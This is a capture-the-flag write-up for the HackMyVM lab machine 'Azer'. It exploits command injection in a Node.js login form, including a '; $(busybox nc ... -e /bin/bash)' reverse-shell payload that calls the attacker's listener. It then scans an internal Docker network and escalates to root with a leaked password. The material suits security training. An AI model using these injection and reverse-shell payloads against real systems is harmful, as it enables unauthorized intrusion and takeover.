# Azer

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Azer | tasiyanci | Beginner | HackMyVM |

**Summary:** Azer is a beginner-level Linux machine featuring a vulnerable Node.js application running on port 3000. The attack vector exploits a command injection vulnerability in a login form where user input is passed unsanitized to a bash script. Initial reconnaissance reveals two HTTP services: Apache on port 80 and a Node.js Express application on port 3000. Through systematic testing of the login functionality, we discover that the username parameter is directly concatenated into a shell command without proper sanitization. By leveraging command substitution syntax `$(command)`, we achieve remote code execution and establish a reverse shell as the user `azer`. Post-exploitation enumeration reveals a Docker bridge network (10.10.10.0/24) with an internal web service at 10.10.10.10:80 that exposes the root password. Privilege escalation is achieved by curling this internal endpoint and using `su` to switch to root.

---

## Reconnaissance

### Network Discovery

The initial network scan identified a VirtualBox VM on the local network:

```powershell
PS C:\Windows\System32> cd D:\CTF_Tools\
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.95 08:00:27:7B:4F:82 VirtualBox
```

### Port Scanning

A comprehensive Nmap scan revealed two HTTP services running on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/azer]
└─$ nmap -sC -sV -p- -T4 192.168.100.95
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 11:10 WIB
Nmap scan report for 192.168.100.95
Host is up (0.0048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: L&#214;SEV | L&#246;semili &#199;ocuklar Vakf\xC4\xB1
|_http-server-header: Apache/2.4.57 (Debian)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Login Page

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.52 seconds
```

**Key Findings:**
- **Port 80**: Apache 2.4.57 hosting a Turkish charity website (LÖSEV)
- **Port 3000**: Node.js application with Express middleware presenting a login page

---

## Initial Access

### Web Application Analysis

Navigating to `http://192.168.100.95:3000` revealed a simple login interface:

![](image.png)

The login page accepts username and password inputs. Initial testing without credentials produced an interesting error message:

![](image-1.png)

**Error Analysis:**
```
Error executing bash script: Command failed: /home/azer/get.sh fatal: not a git repository (or any of the parent directories): .git
```

This error reveals critical information:
1. User input is being passed to a bash script (`/home/azer/get.sh`)
2. The script attempts to execute git commands
3. The application user is likely `azer`

### Command Injection Discovery

Testing with a simple username input (`AAAAAA`) without a password showed that our input was reflected in the error message:

![](image-2.png)

**Reflected Input:**
```
Error executing bash script: Command failed: /home/azer/get.sh AAAAAA fatal: not a git repository (or any of the parent directories): .git
```

This confirms the username is concatenated directly into the command line. The application appears to execute something like:
```bash
/home/azer/get.sh [USERNAME]
```

### Exploitation Attempts

**First Attempt - Simple Injection:**

Testing with `; id` did not produce the expected command execution:

![](image-3.png)

**Output:**
```
Error output from bash script: fatal: not a git repository (or any of the parent directories): .git
```

The simple semicolon injection failed, likely due to how the script processes arguments.

**Second Attempt - Command Substitution:**

Using command substitution syntax `; $(id)` successfully achieved remote code execution:

![](image-4.png)

**Output:**
```
Error executing bash script: Command failed: /home/azer/get.sh ; $(id) fatal: not a git repository (or any of the parent directories): .git /bin/sh: 1: uid=1000(azer): not found
```

The error message shows `/bin/sh: 1: uid=1000(azer): not found`, which means the `id` command executed successfully and returned `uid=1000(azer)`, confirming we have RCE.

### Reverse Shell

With confirmed RCE, we can establish a proper reverse shell.

**Setting up the listener:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/azer]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Payload:**
```
; $(busybox nc 192.168.100.1 4444 -e /bin/bash)
```

This payload uses BusyBox's netcat implementation to execute a bash shell and connect back to our listener.

**Shell Stabilization:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/azer]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 64483
id
uid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
azer@azer:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/azer]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

azer@azer:~$ export SHELL=/bin/bash
azer@azer:~$ export TERM=xterm-256color
azer@azer:~$ stty rows 50 cols 200
azer@azer:~$ reset
```

### User Flag

```bash
azer@azer:~$ ls -la
total 64
drwx------  5 azer azer  4096 Feb 21  2024 .
drwxr-xr-x  3 root root  4096 Feb 21  2024 ..
-rwxr-xr-x  1 azer azer    72 Feb 21  2024 get.sh
drwxr-xr-x 66 azer azer  4096 Feb 21  2024 node_modules
drwxr-xr-x  4 azer azer  4096 Feb 21  2024 .npm
-rw-r--r--  1 azer azer    53 Feb 21  2024 package.json
-rw-r--r--  1 azer azer 25336 Feb 21  2024 package-lock.json
-rw-r--r--  1 azer azer  1950 Feb 21  2024 server.js
drwxr-xr-x  2 azer azer  4096 Feb 21  2024 .ssh
-rw-------  1 azer azer    33 Feb 21  2024 user.txt
```

The user flag is located at `/home/azer/user.txt`.

---

## Privilege Escalation

### Internal Network Enumeration

Checking the network interfaces revealed a Docker bridge network:

```bash
azer@azer:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:7b:4f:82 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.95/24 brd 192.168.100.255 scope global dynamic enp0s3
       valid_lft 349sec preferred_lft 349sec
    inet6 fe80::a00:27ff:fe7b:4f82/64 scope link
       valid_lft forever preferred_lft forever
3: br-333bcb432cd5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:75:f5:e6:18 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.1/24 brd 10.10.10.255 scope global br-333bcb432cd5
       valid_lft forever preferred_lft forever
    inet6 fe80::42:75ff:fef5:e618/64 scope link
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:e1:22:bd:fd brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: veth774dc53@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-333bcb432cd5 state UP group default
    link/ether 4a:d7:b0:84:6c:7c brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::48d7:b0ff:fe84:6c7c/64 scope link
       valid_lft forever preferred_lft forever
```

**Key Observations:**
- Bridge network `br-333bcb432cd5` with subnet `10.10.10.1/24`
- Virtual ethernet interface `veth774dc53` suggesting active Docker containers
- Standard Docker bridge `docker0` on `172.17.0.1/16`

### Port Scanning Docker Network

Using bash TCP connectivity testing to scan the Docker gateway:

```bash
azer@azer:~$ for port in {1..3000}; do (echo > /dev/tcp/10.10.10.1/$port) >/dev/null 2>&1 && echo "Port $port OPEN"; done
Port 80 OPEN
Port 3000 OPEN
```

Ports 80 and 3000 are open on the Docker bridge gateway, likely due to port forwarding from the host.

### Container Discovery

Scanning the Docker subnet for active hosts:

```bash
azer@azer:~$ for i in {2..20}; do echo -n "Checking 10.10.10.$i: "; nc -zv -w 1 10.10.10.$i 80 2>&1 | grep -E "open|succeeded" || echo "Closed"; done
...
Checking 10.10.10.9: Closed
Checking 10.10.10.10: (UNKNOWN) [10.10.10.10] 80 (http) open
Checking 10.10.10.11: Closed
...
```

**Discovery:** A web service is running on `10.10.10.10:80` within the Docker network.

### Credential Extraction

Accessing the internal service:

```bash
azer@azer:~$ curl 10.10.10.10:80
.:.A[REDACTED]
```

The internal web service on the Docker container exposed the root password in plaintext.

### Root Access

Using the discovered credentials to escalate privileges:

```bash
azer@azer:~$ su - root
Password: 
root@azer:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
azer
root@azer:~# cat /root/root.txt /home/azer/user.txt
b5d[REDACTED]
0d2[REDACTED]
```

**Success:** Full system compromise achieved with both user and root flags captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery and identified target at 192.168.100.95. Nmap scan revealed Apache (port 80) and Node.js Express application (port 3000).

2. **Vulnerability Discovery**: Analyzed the login page on port 3000 and discovered that the username parameter is passed unsanitized to a bash script (`/home/azer/get.sh`), creating a command injection vulnerability.

3. **Exploitation**: Bypassed initial injection filters by using command substitution syntax `; $(command)`. Successfully achieved RCE and deployed a BusyBox netcat reverse shell using the payload `; $(busybox nc 192.168.100.1 4444 -e /bin/bash)`.

4. **Internal Enumeration**: Stabilized the shell and enumerated network interfaces, discovering a Docker bridge network (10.10.10.0/24). Performed internal port scanning and identified an HTTP service at 10.10.10.10:80 within the Docker network.

5. **Privilege Escalation**: Used `curl` to access the internal Docker service which exposed the root password in plaintext. Leveraged `su` with the discovered credentials to escalate privileges from user `azer` to root, capturing both user and root flags.

